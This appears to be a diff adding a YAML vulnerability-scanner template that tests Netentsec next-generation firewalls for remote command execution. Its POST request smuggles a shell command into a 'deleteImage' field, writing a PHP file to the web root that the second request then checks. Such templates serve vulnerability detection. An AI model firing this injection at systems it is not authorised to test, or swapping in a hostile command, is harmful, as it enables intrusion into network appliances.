@@ -1,0 +1,30 @@
+detail:
+  author: YekkoY
+  description: "\u7F51\u5EB7\u4E0B\u4E00\u4EE3\u9632\u706B\u5899_\u4EFB\u610F\u547D\
+    \u4EE4\u6267\u884C\u6F0F\u6D1E"
+  links:
+  - https://mp.weixin.qq.com/s/wH5luLISE_G381W2ssv93g
+expression: r0() && r1()
+manual: true
+name: poc-yaml-netentsec-ngfw-rce
+rules:
+  r0:
+    expression: response.status == 200 && response.body.bcontains(b"SSLVPN_Resource")
+      && response.body.bcontains(b"\"result\":{\"success\":true}")
+    request:
+      body: '{"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;echo
+        ''<?php echo md5({{r2}});unlink(__FILE__);?>'' >/var/www/html/{{r2}}.php"]}],"type":"rpc","tid":17}
+
+        '
+      cache: true
+      method: POST
+      path: /directdata/direct/router
+  r1:
+    expression: response.status == 200 && response.body.bcontains(bytes(md5(r2)))
+    request:
+      cache: true
+      method: GET
+      path: /{{r2}}.php
+set:
+  r2: randomLowercase(10)
+transport: http
